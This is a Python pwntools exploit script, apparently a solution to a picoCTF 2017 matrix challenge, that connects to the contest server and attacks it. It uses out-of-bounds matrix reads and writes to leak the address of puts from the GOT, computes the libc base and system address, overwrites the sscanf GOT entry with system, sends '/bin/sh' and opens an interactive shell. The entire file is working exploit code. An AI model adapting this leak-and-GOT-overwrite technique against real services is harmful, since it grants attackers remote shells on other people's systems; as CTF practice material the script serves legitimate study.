#!/usr/bin/env python3

import pwn
import struct

rem = pwn.remote('shell2017.picoctf.com', 32760)

rem.recvuntil('Enter command: ')

def num2flt(value):
	return struct.unpack('f', struct.pack('<L', value))[0]

def flt2num(value):
	return struct.unpack('<L', struct.pack('f', value))[0]

def create_matrix(r, c):
	rem.sendline('create {} {}'.format(r, c))
	rem.recvuntil('Enter command: ')

def set_matrix(i, r, c, v):
	rem.sendline('set {} {} {} {}'.format(i, r, c, v))
	rem.recvuntil('Enter command: ')

def get_matrix(i, r, c):
	rem.sendline('get {} {} {}'.format(i, r, c))
	flt = float(rem.recvline().split(b'=')[-1])
	rem.recvuntil('Enter command: ')
	return flt

puts_got = 0x804a11c
sscanf_plt = 0x804a12c

puts_offset = 0x64da0 
system_offset = 0x3e3e0

create_matrix(16, 4)
create_matrix(1, 7)
create_matrix(16, 4)

set_matrix(0, 5, 0, num2flt(puts_got))
puts_addr = flt2num(get_matrix(2, 0, 0))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset

set_matrix(0, 5, 0, num2flt(sscanf_plt))
sscanf_addr = flt2num(get_matrix(2, 0, 0))

set_matrix(2, 0, 0, num2flt(system_addr))

rem.sendline('/bin/sh')

rem.interactive()
